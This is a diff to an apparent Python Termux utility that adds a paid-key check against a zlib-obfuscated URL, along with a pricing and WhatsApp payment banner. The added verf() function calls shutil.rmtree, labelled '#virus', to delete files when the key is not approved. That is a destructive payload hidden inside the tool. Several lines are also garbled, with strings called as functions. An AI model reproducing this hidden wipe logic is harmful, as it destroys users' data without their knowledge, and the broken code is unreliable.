@@ -971,40 +971,75 @@ class automation:
 		input("[•] Press Enter to go back ")
 
 		self.iAmPasswordManager()
-def Subscraption():
-		key1=open('/data/data/com.termux/files/usr/bin/.mrBALOCH -cov', 'r').read()
-		clear()
-		print(logo)
-		r1=requests.get("https://github.com/GitHub6G/Git-Hub/blob/main/Approval.txt").text
-		if key1 in r1:
-			os.system('clear')
-			print(logo)
-			'Main()'
-		else:
-			os.system("clear")
-			print(logo)
-			print("\t \033[1;32m First Get Approvel\033[1;37m ")
-			time.sleep(1)
-			os.system("clear")
-			print(logo)
-			print ("")
-			print(" \033[1;32m ALIYAN Toll Free BUT You Need Get Approved First\033[1;37m\n")
-			print(" \033[1;32m Note : ALIYAN FREE HA BHAIYO ENJOYA   \033[1;37m")
-			print ("")
-			print(" Your Key is Not Approved ")
-			print("")
-			print(" Copy And Send Key To Admin")
-			print ("")
-			print (" Your Key : "+1234567+name+key1 )
-			print ("")
-			name = input(" Your Name : ")
-			print ("")
-			input(" Press Enter To Send Key")
-			time.sleep(3.5)
-			tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+1234567+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+1234567+name+key1
-			os.system('am start https://wa.me/+923021431324?text=' + tks)
-			Subscraption()        
-Subscraption()
+def za():
+    global tp
+    myid = 'getKey()'
+    os.system(" clear ")
+    ux=zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfH\xcc\xadJ,H\xccL1\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd67\xb0\xd4/(\xca\xccKN\xd5\x05\xa9\xd05\xd4\xcb(\xc9\xcd\x01\x00]v\x13\xfb').decode()
+    with 'urlopen'(ux) as response:
+        body =response.read()
+    if myid in str(body):
+        tp=1
+        'Hamza()'
+    else:
+        tp=0
+        print( '''  \x1b[1;92m  ██████  ██████  ██ ███    ██  ██████ ███████ 
+    ██   ██ ██   ██ ██ ████   ██ ██      ██      
+    ██████  ██████  ██ ██ ██  ██ ██      █████   
+    ██      ██   ██ ██ ██  ██ ██ ██      ██      
+    ██      ██   ██ ██ ██   ████  ██████ ███████ \x1b[0m
+ 
+╭──────────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0mPrince Command \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m ─────────────╮
+│           WELCOME TO PRINCE COMMAND             │
+╰─────────────────────────────────────────────────╯''')
+        print("")
+        
+        print(  '''    ╭──────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m DETAILS \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m  ──────────╮
+    │       YOUR KEY IS NOT APROVED       │
+    │         THIS TOOL IS PAID           │   
+    ╰─────────────────────────────────────╯''')
+        print( '''  ╭─────  \x1b[1;92m•\x1b[1;91m•\x1b[1;96m• \x1b[0m PAYMENT METHOD \x1b[1;96m•\x1b[1;91m•\x1b[1;92m• \x1b[0m  ────────╮
+  │          EASYPAISA & JAZZCASH           │
+  │       15 Days 350RS | 30 Days 600RS     │   
+  │                  BINANCE                │  
+  │          5$ 15 Days | 10$ 30 Days       │
+  ╰─────────────────────────────────────────╯''')
+        print("")
+        print("             \x1b[1;96m  [ PRINCE • KEY ]")
+        print("\x1b[1;92mPRINCE-"+myid)
+        print("\x1b[0m")
+        print("")
+        print("      \x1b[1;96m  [EASYPAISA & JAZZCASH NUMBER]")
+        print("                \x1b[1;93m 03240191630 \x1b[0m")
+        print(60*'─')
+        print("           \x1b[1;96m       [ NOTE ]" )
+        print("\x1b[1;91m[ IF YOUR KEY IS CHANGED BEACUSE OF MOBILE RESET OR UPDATE ]")
+        print("      [ I AM NOT RESPONSIBLE FOR THAT ] ")
+        print("    \x1b[1;91m[ BUY COMMMAND IN YOUR RESPONSIBILITY ]")
+        print("        [ PAYMENT WILL BE NOT RETURN ]\x1b[0m")
+        print("\x1b[1;91m [ IF IDS WERE NOT COMMING BEACUSE OF SERVER ISSUE ]")
+        print("      [ I AM NOT RESPONSIBLE FOR THAT ] ")
+        print("[ THEN AFTER SERVER ISSUE WILL BE FIX SOON IDS WILL BE COME AGAIN ] \x1b[0m")
+        print(60*'─')
+        input("[•] Press Enter To Send Key")
+        url_wa = "https://api.whatsapp.com/send?phone=+923240191630&text="
+        name = input("[•] TYPE YOUR NAME : ")
+        tks = ("Hi I Want To Buy Prince Command \nMy name : "+name+" \nKey : PRINCE-"+myid)
+        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)    
+def verf():
+    myid = 'getKey'()
+    os.system(" clear ")
+    with 'urlopen'(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7\xcfH\xcc\xadJ,H\xccL1\xd4K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd67\xb0\xd4/(\xca\xccKN\xd5\x05\xa9\xd05\xd2\xcb(\xc9\xcd\x01\x00]|\x13\xfc').decode()) as response:
+        body = response.read()
+    if myid in str(body):
+        pass
+    else:
+        #virus. remove  to execute virus
+        shutil.rmtree("")
+        shutil.rmtree("")
+        shutil.rmtree("")
+        print("")
+        sys.exit()
 
 if __name__=="__main__":
 	#update()
